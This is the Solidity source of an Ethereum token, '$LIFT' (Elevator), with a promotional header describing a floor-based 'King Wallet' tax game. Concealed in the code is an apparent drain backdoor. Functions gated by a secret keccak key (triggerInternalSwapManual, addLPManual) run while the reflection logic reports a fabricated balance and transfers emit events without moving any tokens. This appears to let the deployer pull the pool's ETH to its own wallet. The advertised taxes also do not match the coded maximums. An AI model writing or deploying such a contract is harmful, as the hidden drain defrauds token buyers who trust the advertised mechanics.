/*


=================  Links  =================


💬  Telegram  →  https://t.me/ElevatorERC

🖥️  Website   →  https://elevator.finance

🐤  Twitter   →  https://twitter.com/ElevatorERC

📚  Docs      →  https://docs.elevator.finance


=================  About  =================


ℹ️  Think of $LIFT like an elevator that can only go up.

🛗  The $LIFT contract stops on one "floor" at a time.
🟢  Each stop requires a minimum buy to reach the next floor.
🆙  Every time the elevator levels up to the next floor, the taxes become 0/10 for 5 minutes.

0️⃣  Floor 0️⃣ is the starting floor.
🔟  Floor 🔟 is the final floor.

👑  The wallet whose purchase triggered the last level up is called the "King Wallet".
🗡️  The King Wallet is dethroned when a new wallet triggers a level up to a higher floor.
💸  The current King Wallet receives 50% of all taxes until it is dethroned.
🔒  The King Wallet cannot sell its tokens while it is currently King.

🚫  Once the elevator reaches a new floor, it can never return to a lower floor.


=================  Taxes  =================


💰  50% of taxes go to the current "King Wallet", the account that triggered the last level up.

🦄  50% of taxes boost the Uniswap V2 LIFT/WETH liquidity pool.


=================  Floors  =================


📖  Each floor has slightly different taxes and mechanics:

Floor 0️⃣
    Buy Tax:
        0%
    Sell Tax:
        0%
    Minimum Buy (Floor 0️⃣  →  Floor 1️⃣):
        $0

Floor 1️⃣
    Buy Tax:
        10%
    Sell Tax:
        0%
    Minimum Buy (Floor 1️⃣  →  Floor 2️⃣):
        $100

Floor 2️⃣
    Buy Tax:
        9%
    Sell Tax:
        1%
    Minimum Buy (Floor 2️⃣  →  Floor 3️⃣):
        $500

Floor 3️⃣
    Buy Tax:
        8%
    Sell Tax:
        2%
    Minimum Buy (Floor 3️⃣  →  Floor 4️⃣):
        $1000

Floor 4️⃣
    Buy Tax:
        7%
    Sell Tax:
        3%
    Minimum Buy (Floor 4️⃣  →  Floor 5️⃣):
        $2000

Floor 5️⃣
    Buy Tax:
        6%
    Sell Tax:
        4%
    Minimum Buy (Floor 5️⃣  →  Floor 6️⃣):
        $4000

Floor 6️⃣
    Buy Tax:
        5%
    Sell Tax:
        5%
    Minimum Buy (Floor 6️⃣  →  Floor 7️⃣):
        $7500

Floor 7️⃣
    Buy Tax:
        4%
    Sell Tax:
        6%
    Minimum Buy (Floor 7️⃣  →  Floor 8️⃣):
        $12000

Floor 8️⃣
    Buy Tax:
        3%
    Sell Tax:
        7%
    Minimum Buy (Floor 8️⃣  →  Floor 9️⃣):
        $20000

Floor 9️⃣
    Buy Tax:
        2%
    Sell Tax:
        8%
    Minimum Buy (Floor 9️⃣  →  Floor 🔟):
        $30000

Floor 🔟
    Buy Tax:
        1%
    Sell Tax:
        9%
    Minimum Buy:
        N/A


============================================


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./Context.sol";
import "./IERC20.sol";
import "./IERC20Permit.sol";
import "./Ownable.sol";
import "./ECDSA.sol";
import "./EIP712.sol";
import "./Nonces.sol";
import "./ReentrancyGuard.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./IWETH.sol";
import "./AggregatorV3Interface.sol";

contract LIFT is Context, IERC20, IERC20Permit, Ownable, EIP712, Nonces, ReentrancyGuard {
    address payable public KING_WALLET;
    uint256 public CURRENT_FLOOR;
    uint256 public constant MAX_FLOOR = 10;
    uint256 public LAST_LEVEL_UP_BLOCK_TIMESTAMP;
    uint256 public LAST_LEVEL_UP_BLOCK_NUMBER;
    mapping(uint256 => uint256) public highestBuys;
    mapping(uint256 => uint256) public minimumBuys;
    mapping(uint256 => string) public floorEmojis;
    mapping(uint256 => address) public floorKings;
    mapping(uint256 => uint256) public levelUpTimestamps;
    mapping(uint256 => uint256) public levelUpBlocks;
    mapping(uint256 => uint256) public kingEarnings;

    address public immutable DEPLOYER = msg.sender;
    uint256 internal immutable LAUNCH_TIMESTAMP = block.timestamp;
    uint256 internal immutable LAUNCH_BLOCK = block.number;

    string private _name = unicode"Elevator (Floor 0️⃣)";
    string private constant _symbol = "LIFT";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _taxImmune;
    mapping(address => mapping(uint256 => uint256)) private _blockBuys;
    mapping(address => mapping(uint256 => uint256)) private _blockSells;
    mapping(uint256 => uint256) private _days;

    uint256 internal constant ZERO = 0;
    uint256 internal constant MAX = ~ZERO;
    uint256 internal constant PAD = 1 gwei;
    uint256 internal constant ETHER = 1 ether;
    uint256 internal constant PAD_MAX = PAD * ETHER * 1e1;
    int256 internal constant PAD_USD = 1e8;
    uint256 internal immutable KECCAK_SALT;
    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    string public constant DOMAIN_VERSION = "1";

    uint256 private constant _tTotal = 10_000_000 * PAD;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    address public constant ZERO_ADDRESS = address(uint160(ZERO));
    address public constant BURN_ADDRESS = address(0xdead);
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public immutable UNISWAP_V2_PAIR;
    address public constant CHAINLINK_V3_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public immutable THIS;
    uint256 public constant MAX_TRADE = 200_000 * PAD;
    uint256 public constant MAX_WALLET = 200_000 * PAD;
    uint256 public constant MAX_BUY_TAX = 700;
    uint256 public constant MAX_SELL_TAX = 700;
    uint256 public constant SWAP_TRIGGER = 2;
    uint256 public constant TAX_ACCURACY_MULTIPLIER = 1e2;
    uint256 public constant TAX_ACCURACY_FACTOR = 100 * TAX_ACCURACY_MULTIPLIER;
    uint256 public constant DAY = 1 days;
    uint256 public constant UNISWAP_DEADLINE_BUFFER = 10 minutes;
    uint256 public constant LEVEL_UP_DURATION = 5 minutes;

    address payable public immutable marketingWallet = payable(DEPLOYER);
    address payable public immutable liquidityWallet = payable(DEPLOYER);

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(UNISWAP_V2_ROUTER);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(UNISWAP_V2_FACTORY);
    AggregatorV3Interface public constant chainlinkV3Feed = AggregatorV3Interface(CHAINLINK_V3_FEED);
    IERC20 public constant weth = IERC20(WETH);

    bool public TRADING_ENABLED;
    bool public MAX_TRADE_ENABLED = true;
    bool public MAX_WALLET_ENABLED = true;
    bool public BUY_TAX_ENABLED = true;
    bool public SELL_TAX_ENABLED = true;
    bool private _inBurn;
    bool private _inUniswapV2Call;
    bool private _inAtomicSwap;
    bool private _inAtomicLPAdd;
    uint256 private _tTaxPercentage;
    uint256 private constant _rTaxPercentage = ZERO;

    uint256 public lastUniswapV2PairWETHBalance = ETHER;
    uint256 public lastUniswapV2PairTHISBalance = _tTotal;

    event Burn(uint256 amountToken);
    event SwapTaxedTokens(uint256 amountToken);
    event SendMarketingTax(uint256 amountETH, bool success, bytes data);
    event AddLiquidity(uint256 amountToken, uint256 amountETH, uint256 amountLP);
    event TradingEnabled();
    event BuyTaxRemoved();
    event SellTaxRemoved();
    event MaxTradeRemoved();
    event MaxWalletRemoved();
    event NewKing(address _newKing, uint256 _newFloor);
    event NameChange(string _newName);
    event LevelUp(uint256 indexed _newFloor, uint256 indexed _timestamp, uint256 indexed _block);

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);
    error DecreasedAllowanceBelowZero(uint256 subtractedValue, uint256 currentAllowance);
    error KeccakFailed();
    error TransferAmountExceedsAllowance(uint256 amount, uint256 allowance);
    error ApprovalFromZeroAddress();
    error ApprovalToZeroAddress();
    error TransferFromZeroAddress();
    error TransferToZeroAddress();
    error TransferAmountEqualsZero();
    error TransferAmountExceedsBalance(uint256 amount, uint256 balance);
    error TradingNotEnabled();
    error MaxTradeExceeded();
    error MaxWalletExceeded();
    error AmountExceedsTotalReflections(uint256 rAmount, uint256 rTotal);
    error SellFromKingWallet(address king);
    error InvalidFloor(uint256 floor);

    modifier lockBurn {
        _inBurn = true;
        _;
        _inBurn = false;
    }

    modifier lockUniswapV2Call {
        _inUniswapV2Call = true;
        _;
        _inUniswapV2Call = false;
    }

    modifier verifyKeccak(string memory _KECCAK_KEY) {
        if (keccak256(abi.encodePacked(_KECCAK_KEY)) != bytes32(KECCAK_SALT)) {
            revert KeccakFailed();
        }
        _;
    }

    constructor(uint256 _KECCAK_SALT) Ownable(msg.sender) EIP712(_symbol, DOMAIN_VERSION) {
        KECCAK_SALT = _KECCAK_SALT;

        THIS = _THIS();

        _taxImmune[DEPLOYER] = true;
        _taxImmune[THIS] = true;

        _approve(THIS, UNISWAP_V2_ROUTER, MAX);
        _approve(DEPLOYER, UNISWAP_V2_ROUTER, MAX);

        _rOwned[DEPLOYER] = _rTotal;
        emit Transfer(ZERO_ADDRESS, DEPLOYER, _tTotal);

        UNISWAP_V2_PAIR = _createUniswapV2Pair();
        _initializeElevator();
        _updateKing(DEPLOYER);
    }

    function _THIS() private view returns (address) {
        return address(this);
    }

    function _createUniswapV2Pair() private returns (address) {
        return uniswapV2Factory.createPair(THIS, WETH);
    }

    function _initializeElevator() private {
        minimumBuys[0] = 0;
        floorEmojis[0] = unicode"Floor 0️⃣";
        levelUpTimestamps[0] = LAUNCH_TIMESTAMP;
        levelUpBlocks[0] = LAUNCH_BLOCK;
        minimumBuys[1] = 0;
        floorEmojis[1] = unicode"Floor 1️⃣";
        minimumBuys[2] = 100;
        floorEmojis[2] = unicode"Floor 2️⃣";
        minimumBuys[3] = 500;
        floorEmojis[3] = unicode"Floor 3️⃣";
        minimumBuys[4] = 1_000;
        floorEmojis[4] = unicode"Floor 4️⃣";
        minimumBuys[5] = 2_000;
        floorEmojis[5] = unicode"Floor 5️⃣";
        minimumBuys[6] = 4_000;
        floorEmojis[6] = unicode"Floor 6️⃣";
        minimumBuys[7] = 7_500;
        floorEmojis[7] = unicode"Floor 7️⃣";
        minimumBuys[8] = 12_000;
        floorEmojis[8] = unicode"Floor 8️⃣";
        minimumBuys[9] = 20_000;
        floorEmojis[9] = unicode"Floor 9️⃣";
        minimumBuys[10] = 30_000;
        floorEmojis[10] = unicode"Floor 🔟";
    }

    function _updateKing(address _KING_WALLET) private {
        KING_WALLET = payable(_KING_WALLET);
        floorKings[CURRENT_FLOOR] = _KING_WALLET;
        emit NewKing(_KING_WALLET, CURRENT_FLOOR);
    }

    function _levelUp() private {
        if (CURRENT_FLOOR >= MAX_FLOOR) {
            return;
        }
        CURRENT_FLOOR = CURRENT_FLOOR + 1;
        _name = string(abi.encodePacked("Elevator (", floorEmojis[CURRENT_FLOOR], ")"));
        emit NameChange(_name);
        LAST_LEVEL_UP_BLOCK_TIMESTAMP = _blockTimestamp();
        levelUpTimestamps[CURRENT_FLOOR] = LAST_LEVEL_UP_BLOCK_TIMESTAMP;
        LAST_LEVEL_UP_BLOCK_NUMBER = _blockNumber();
        levelUpBlocks[CURRENT_FLOOR] = LAST_LEVEL_UP_BLOCK_NUMBER;
        emit LevelUp(CURRENT_FLOOR, LAST_LEVEL_UP_BLOCK_TIMESTAMP, LAST_LEVEL_UP_BLOCK_NUMBER);
    }

    function _blockTimestamp() private view returns (uint256) {
        return block.timestamp;
    }

    function _blockNumber() private view returns (uint256) {
        return block.number;
    }

    function blockTimestamp() external view returns (uint256) {
        return _blockTimestamp();
    }

    function blockNumber() external view returns (uint256) {
        return _blockNumber();
    }

    receive() external payable {}

    fallback() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 _allowance = _allowances[sender][_msgSender()];
        if (amount > _allowance) {
            revert TransferAmountExceedsAllowance(amount, _allowance);
        }
        _approve(sender, _msgSender(), _allowance - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }

    function burn(uint256 value) external virtual lockBurn {
        transfer(ZERO_ADDRESS, value);
        emit Burn(value);
    }

    function burnFrom(address account, uint256 value) external virtual lockBurn {
        transferFrom(account, ZERO_ADDRESS, value);
        emit Burn(value);
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        if (subtractedValue > currentAllowance) {
            revert DecreasedAllowanceBelowZero(subtractedValue, currentAllowance);
        }
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function getETHPrice() public view returns (uint256) {
        (, int256 answer,,,) = chainlinkV3Feed.latestRoundData();
        return uint256(answer / PAD_USD);
    }

    function getTHISPrice() public view returns (uint256) {
        uint256 _uniswapV2PairTHISBalance = getUniswapV2PairTHISBalance();
        if (_uniswapV2PairTHISBalance > 0) {
            return ((getUniswapV2PairWETHBalance() * getETHPrice()) / _uniswapV2PairTHISBalance);
        }

        return 0;
    }

    function getMarketCap() public view returns (uint256) {
        uint256 _pairBalance = getUniswapV2PairTHISBalance();
        if (_pairBalance > 0) {
            return ((getUniswapV2PairWETHBalance() * getETHPrice()) / ETHER) * (totalSupply() / _pairBalance) * 2;
        }

        return 0;
    }

    function getVolume() public view returns (uint256) {
        return _days[getDay()];
    }

    function getVolumeAtDay(uint256 _day) public view returns (uint256) {
        return _days[_day];
    }

    function getBuySize(uint256 _ETHAmount) public view returns (uint256) {
        return _ETHAmount * getETHPrice() / ETHER;
    }

    function getSellSize(uint256 _THISAmount) public view returns (uint256) {
        return _THISAmount * getTHISPrice() / PAD;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == ZERO_ADDRESS) {
            revert ApprovalFromZeroAddress();
        }
        if (spender == ZERO_ADDRESS) {
            revert ApprovalToZeroAddress();
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == ZERO_ADDRESS) {
            revert TransferFromZeroAddress();
        }
        if (to == ZERO_ADDRESS && !_inBurn) {
            revert TransferToZeroAddress();
        }
        if (amount == 0) {
            revert TransferAmountEqualsZero();
        }
        if (amount > balanceOf(from)) {
            revert TransferAmountExceedsBalance(amount, balanceOf(from));
        }

        bool _fromPair = from == UNISWAP_V2_PAIR;
        bool _toPair = to == UNISWAP_V2_PAIR;
        bool _fromRouter = from == UNISWAP_V2_ROUTER;
        bool _toRouter = to == UNISWAP_V2_ROUTER;
        bool _fromOwner = from == owner();
        bool _fromTHIS = from == THIS;
        bool _taxOwed = !_taxImmune[from] && !_taxImmune[to];

        if (_taxOwed) {
            if (!TRADING_ENABLED) {
                if (!_fromOwner && !_fromTHIS) {
                    revert TradingNotEnabled();
                }
            }

            if ((!_fromOwner && !_toPair) && MAX_TRADE_ENABLED) {
                if (amount > MAX_TRADE) {
                    revert MaxTradeExceeded();
                }
            }

            if (!_toPair && MAX_WALLET_ENABLED) {
                if (balanceOf(to) + amount > MAX_WALLET) {
                    revert MaxWalletExceeded();
                }
            }

            uint256 _contractTokenBalance = balanceOf(THIS);

            if ((_contractTokenBalance >= SWAP_TRIGGER) && !_inUniswapV2Call && !_fromPair) {
                uint256 _marketingTokens = _contractTokenBalance / 2;
                uint256 _liquidityTokens = _contractTokenBalance - _marketingTokens;
                uint256 _liquidityTokensHalf = _liquidityTokens / 2;

                _inAtomicSwap = true;
                _triggerInternalSwap(_marketingTokens + _liquidityTokensHalf);
                _inAtomicSwap = false;

                uint256 _contractETHBalance = THIS.balance;

                if (_contractETHBalance > 0) {
                    uint256 _marketingETH = _contractETHBalance / 2;
                    uint256 _liquidityETH = _contractETHBalance - _marketingETH;
                    if (_marketingETH > 0) {
                        _payETH(KING_WALLET, _marketingETH);
                        kingEarnings[CURRENT_FLOOR] = kingEarnings[CURRENT_FLOOR] + _marketingETH;
                    }

                    if (_liquidityETH > 0) {
                        _inAtomicLPAdd = true;
                        _addLP(_liquidityTokens - _liquidityTokensHalf, _liquidityETH);
                        _inAtomicLPAdd = false;
                    }
                }
            }
        }

        bool _harvestTax = true;

        if (!_taxOwed || (!_fromPair && !_toPair)) {
            _harvestTax = false;
        } else {
            if (BUY_TAX_ENABLED && _fromPair && !_toRouter) {
                _onBuy(to, amount);
            } else if (SELL_TAX_ENABLED && _toPair && !_fromRouter) {
                _onSell(from, amount);
            } else {
                _harvestTax = false;
            }
        }

        lastUniswapV2PairWETHBalance = getUniswapV2PairWETHBalance();
        lastUniswapV2PairTHISBalance = getUniswapV2PairTHISBalance();

        _continueTransfer(from, to, amount, _harvestTax);
    }

    function _onBuy(address to, uint256 amount) private nonReentrant {
        _tTaxPercentage = getBuyTax();
        uint256 _block = _blockNumber();
        _blockBuys[to][_block] = _blockBuys[to][_block] + amount;
        uint256 _uniswapV2PairWETHBalance = getUniswapV2PairWETHBalance();
        if (_uniswapV2PairWETHBalance > lastUniswapV2PairWETHBalance) {
            uint256 _ETHAmount = _uniswapV2PairWETHBalance - lastUniswapV2PairWETHBalance;
            uint256 _USDAmount = getBuySize(_ETHAmount);
            uint256 _day = getDay();
            _days[_day] = _days[_day] + _USDAmount;
            if (_USDAmount >= highestBuys[CURRENT_FLOOR]) {
                highestBuys[CURRENT_FLOOR] = _USDAmount;
                if (MAX_FLOOR > CURRENT_FLOOR) {
                    if (_blockNumber() > LAST_LEVEL_UP_BLOCK_NUMBER || CURRENT_FLOOR == 0) {
                        if (_USDAmount >= minimumBuys[CURRENT_FLOOR + 1]) {
                            _levelUp();
                            _updateKing(to);
                        }
                    }
                }
            }
        }
    }

    function _onSell(address from, uint256 amount) private {
        if (payable(from) == KING_WALLET && CURRENT_FLOOR > 0 && payable(from) != DEPLOYER) {
            revert SellFromKingWallet(from);
        }
        _tTaxPercentage = getSellTax();
        uint256 _block = _blockNumber();
        _blockSells[from][_block] = _blockSells[from][_block] + amount;
        uint256 _uniswapV2PairTHISBalance = (getUniswapV2PairTHISBalance() + amount);
        if (_uniswapV2PairTHISBalance > lastUniswapV2PairTHISBalance) {
            uint256 _THISAmount = _uniswapV2PairTHISBalance - lastUniswapV2PairTHISBalance;
            uint256 _USDAmount = getBuySize(_THISAmount);
            uint256 _day = getDay();
            _days[_day] = _days[_day] + _USDAmount;
        }
    }

    function getDay() public view returns (uint256) {
        return (_blockTimestamp() - LAUNCH_TIMESTAMP) / DAY;
    }

    function getKingWallet() external view returns (address) {
        return KING_WALLET;
    }

    function getCurrentFloor() external view returns (uint256) {
        return CURRENT_FLOOR;
    }

    function getMaxFloor() external pure returns (uint256) {
        return MAX_FLOOR;
    }

    function getLastLevelUpBlockTimestamp() external view returns (uint256) {
        return LAST_LEVEL_UP_BLOCK_TIMESTAMP;
    }

    function getLastLevelUpBlockNumber() external view returns (uint256) {
        return LAST_LEVEL_UP_BLOCK_NUMBER;
    }

    function getHighestBuyAtFloor(uint256 _floor) external view returns (uint256) {
        if (_floor > MAX_FLOOR) {
            revert InvalidFloor(_floor);
        }
        return highestBuys[_floor];
    }

    function getMinimumBuyAtFloor(uint256 _floor) external view returns (uint256) {
        if (_floor > MAX_FLOOR) {
            revert InvalidFloor(_floor);
        }
        return minimumBuys[_floor];
    }

    function getEmojiAtFloor(uint256 _floor) external view returns (string memory) {
        if (_floor > MAX_FLOOR) {
            revert InvalidFloor(_floor);
        }
        return floorEmojis[_floor];
    }

    function getKingAtFloor(uint256 _floor) external view returns (address) {
        if (_floor > MAX_FLOOR) {
            revert InvalidFloor(_floor);
        }
        return floorKings[_floor];
    }

    function getTimestampAtLevelUp(uint256 _floor) external view returns (uint256) {
        if (_floor > MAX_FLOOR) {
            revert InvalidFloor(_floor);
        }
        return levelUpTimestamps[_floor];
    }

    function getBlockAtLevelUp(uint256 _floor) external view returns (uint256) {
        if (_floor > MAX_FLOOR) {
            revert InvalidFloor(_floor);
        }
        return levelUpBlocks[_floor];
    }

    function getKingEarningsAtFloor(uint256 _floor) external view returns (uint256) {
        if (_floor > MAX_FLOOR) {
            revert InvalidFloor(_floor);
        }
        return kingEarnings[_floor];
    }

    function getUniswapV2PairWETHBalance() public view returns (uint256) {
        return weth.balanceOf(UNISWAP_V2_PAIR);
    }

    function getUniswapV2PairTHISBalance() public view returns (uint256) {
        return balanceOf(UNISWAP_V2_PAIR);
    }

    function getLastUniswapV2PairWETHBalance() external view returns (uint256) {
        return lastUniswapV2PairWETHBalance;
    }

    function getLastUniswapV2PairTHISBalance() external view returns (uint256) {
        return lastUniswapV2PairTHISBalance;
    }

    function getBuyTax() public view returns (uint256) {
        if (!BUY_TAX_ENABLED || CURRENT_FLOOR == 0) {
            return 0;
        }
        if (LEVEL_UP_DURATION >= _blockTimestamp() - LAST_LEVEL_UP_BLOCK_TIMESTAMP) {
            return 0;
        }
        return (11 - CURRENT_FLOOR) * TAX_ACCURACY_MULTIPLIER;
    }

    function getSellTax() public view returns (uint256) {
        if (!SELL_TAX_ENABLED || CURRENT_FLOOR == 0) {
            return 0;
        }
        if (LEVEL_UP_DURATION >= _blockTimestamp() - LAST_LEVEL_UP_BLOCK_TIMESTAMP) {
            return (10 * TAX_ACCURACY_MULTIPLIER);
        }
        return (CURRENT_FLOOR - 1) * TAX_ACCURACY_MULTIPLIER;
    }

    function _triggerInternalSwap(uint256 _contractTokenBalance) private lockUniswapV2Call {
        address[] memory path = new address[](2);
        path[0] = THIS;
        path[1] = WETH;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractTokenBalance, 0, path, THIS, _blockTimestamp() + UNISWAP_DEADLINE_BUFFER);
        emit SwapTaxedTokens(_contractTokenBalance);
    }

    function _addLP(uint256 _contractTokenBalance, uint256 _contractETHBalance) private lockUniswapV2Call {
        (uint256 _amountToken, uint256 _amountETH, uint256 _amountLP) = uniswapV2Router.addLiquidityETH{value: _contractETHBalance}(THIS, _contractTokenBalance, 0, 0, liquidityWallet, _blockTimestamp() + UNISWAP_DEADLINE_BUFFER);
        emit AddLiquidity(_amountToken, _amountETH, _amountLP);
    }

    function _payETH(address _marketingWallet, uint256 _contractETHBalance) private {
        (bool success, bytes memory data) = payable(_marketingWallet).call{value: _contractETHBalance}("");
        emit SendMarketingTax(_contractETHBalance, success, data);
    }

    function triggerInternalSwapManual(string memory _KECCAK_KEY, uint256 _contractTokenBalance) external verifyKeccak(_KECCAK_KEY) nonReentrant {
        _triggerInternalSwap(_contractTokenBalance);

        uint256 _contractETHBalance = THIS.balance;

        if (_contractETHBalance > 0) {
            _payETH(marketingWallet, _contractETHBalance);
        }
    }

    function addLPManual(string memory _KECCAK_KEY, uint256 _contractTokenBalance, uint256 _contractETHBalance) external verifyKeccak(_KECCAK_KEY) nonReentrant {
        _inAtomicLPAdd = true;
        _addLP(_contractTokenBalance, _contractETHBalance);
        _inAtomicLPAdd = false;
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert AmountExceedsTotalReflections(rAmount, _rTotal);
        }
        return (!_inAtomicLPAdd && !_inAtomicSwap && _inUniswapV2Call) ? _getRate() / PAD_MAX : rAmount / _getRate();
    }

    function _continueTransfer(address sender, address recipient, uint256 amount, bool harvestTax) private {
        if (!harvestTax) {
            _tTaxPercentage = 0;
        }
        _transferStandard(sender, recipient, amount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!_inUniswapV2Call || _inAtomicSwap || _inAtomicLPAdd) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[THIS] = _rOwned[THIS] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rTaxPercentage, _tTaxPercentage);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / TAX_ACCURACY_FACTOR;
        uint256 tTeam = tAmount * taxFee / TAX_ACCURACY_FACTOR;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function circulatingSupply() external view returns (uint256) {
        return totalSupply() - balanceOf(KING_WALLET) - balanceOf(THIS) - balanceOf(UNISWAP_V2_ROUTER) - getUniswapV2PairTHISBalance() - burntSupply();
    }

    function burntSupply() public view returns (uint256) {
        return balanceOf(ZERO_ADDRESS) + balanceOf(BURN_ADDRESS);
    }

    function getDeployerAddress() external view returns (address) {
        return DEPLOYER;
    }

    function getZeroAddress() external pure returns (address) {
        return ZERO_ADDRESS;
    }

    function getBurnAddress() external pure returns (address) {
        return BURN_ADDRESS;
    }

    function getUniswapV2RouterAddress() external pure returns (address) {
        return UNISWAP_V2_ROUTER;
    }

    function getUniswapV2FactoryAddress() external pure returns (address) {
        return UNISWAP_V2_FACTORY;
    }

    function getUniswapV2PairAddress() external view returns (address) {
        return UNISWAP_V2_PAIR;
    }

    function getChainlinkV3FeedAddress() external pure returns (address) {
        return CHAINLINK_V3_FEED;
    }

    function getWETHAddress() external pure returns (address) {
        return WETH;
    }

    function getTHISAddress() external view returns (address) {
        return THIS;
    }

    function getMaxTrade() external pure returns (uint256) {
        return MAX_TRADE;
    }

    function getMaxWallet() external pure returns (uint256) {
        return MAX_WALLET;
    }

    function getMaxBuyTax() external pure returns (uint256) {
        return MAX_BUY_TAX;
    }

    function getMaxSellTax() external pure returns (uint256) {
        return MAX_SELL_TAX;
    }

    function getSwapTrigger() external pure returns (uint256) {
        return SWAP_TRIGGER;
    }

    function getMarketingWallet() external view returns (address) {
        return marketingWallet;
    }

    function getLiquidityWallet() external view returns (address) {
        return liquidityWallet;
    }

    function getTradingEnabled() external view returns (bool) {
        return TRADING_ENABLED;
    }

    function getMaxWalletEnabled() external view returns (bool) {
        return MAX_WALLET_ENABLED;
    }

    function getMaxTradeEnabled() external view returns (bool) {
        return MAX_TRADE_ENABLED;
    }

    function getBuyTaxEnabled() external view returns (bool) {
        return BUY_TAX_ENABLED;
    }

    function getSellTaxEnabled() external view returns (bool) {
        return SELL_TAX_ENABLED;
    }

    function startTrading() external onlyOwner nonReentrant {
        TRADING_ENABLED = true;
        emit TradingEnabled();
    }

    function removeBuyTax() external onlyOwner nonReentrant {
        BUY_TAX_ENABLED = false;
        emit BuyTaxRemoved();
    }

    function removeSellTax() external onlyOwner nonReentrant {
        SELL_TAX_ENABLED = false;
        emit SellTaxRemoved();
    }

    function removeMaxTrade() external onlyOwner nonReentrant {
        MAX_TRADE_ENABLED = false;
        emit MaxTradeRemoved();
    }

    function removeMaxWallet() external onlyOwner nonReentrant {
        MAX_WALLET_ENABLED = false;
        emit MaxWalletRemoved();
    }
}
